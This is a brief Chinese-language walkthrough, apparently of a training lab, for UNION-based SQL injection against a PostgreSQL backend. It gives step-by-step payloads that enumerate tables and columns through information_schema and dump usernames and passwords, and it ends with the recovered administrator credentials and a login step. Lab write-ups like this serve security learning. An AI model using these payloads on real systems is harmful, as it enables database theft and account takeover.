①列数
②显示位
③确定数据库类型
PostgreSQL
④找存有用户数据的表名
```SQL
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
**users_** kwlrns

⑤找到列名
```SQL
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_kwlrns'--
```
**username_** njmtqz         **password_** cbmtzs
⑥找到密码
```SQL
'+UNION+SELECT+username_njmtqz,+password_cbmtzs+FROM+users_kwlrns--
```
administrastor
y5pt3h2bgrfygo6c4t9p
⑦登录